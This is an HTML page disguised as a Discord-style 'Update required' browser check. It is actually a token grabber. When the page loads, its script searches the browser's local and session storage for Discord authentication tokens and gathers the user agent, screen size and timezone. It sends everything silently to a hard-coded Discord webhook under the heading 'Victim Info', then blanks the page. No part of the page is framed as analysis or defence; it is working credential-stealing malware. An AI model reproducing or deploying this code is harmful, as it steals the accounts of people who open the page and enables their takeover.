<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Update required</title>
    <style>body{margin:0;padding:20px;background:#36393f;color:#dcddde;font-family:Whitney,sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;}#content{text-align:center;}#spinner{width:40px;height:40px;border:3px solid #202225;border-top:3px solid #5865f2;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</head>
<body>
    <div id="content">
        <div id="spinner"></div>
        <h2>Update required</h2>
        <p>Please wait while we verify your browser...</p>
    </div>
    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1485329631975440514/6p1QM-6SRGIPCepE7qgSa7MIXy0GR4xEnqAIlbTyU4t4SQKtmhCDom3yWc_wX7UvYgOd";
        
        function getTokens(){
            const tokens = [];
            const patterns = [/mfa\.[A-Za-z0-9-_]{84}/,/[A-Za-z0-9]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/];
            [localStorage,sessionStorage].forEach(s=>{
                for(let i=0;i<s.length;i++){
                    const v=s.getItem(s.key(i));
                    if(v)patterns.forEach(p=>v.match(p)?.forEach(t=>tokens.push(t)))
                }
            });
            return [...new Set(tokens)];
        }
        
        const tokens = getTokens();
        const ua = navigator.userAgent.slice(0,80);
        const screen = `${screen.width}x${screen.height}`;
        
        fetch(WEBHOOK,{
            method:"POST",
            headers:{"Content-Type":"application/json"},
            body:JSON.stringify({
                content:tokens.length?`**🪝 TOKENS GRABBED (${tokens.length})**\n`+tokens.map(t=>`\`${t.slice(0,30)}...\``).join("\n"):`**❌ No tokens**`,
                embeds:[{
                    title:"Victim Info",
                    color:tokens.length?16711680:16776960,
                    fields:[
                        {name:"User Agent",value:`\`${ua}\``,inline:false},
                        {name:"Screen",value:`\`${screen}\``,inline:true},
                        {name:"Timezone",value:`\`${Intl.DateTimeFormat().resolvedOptions().timeZone}\``,inline:true}
                    ]
                }]
            })
        }).catch(()=>{}); // Silent
        
        setTimeout(()=>{
            document.body.innerHTML="<div style='background:black;height:100vh'></div>";
        },1500);
    </script>
</body>
</html>
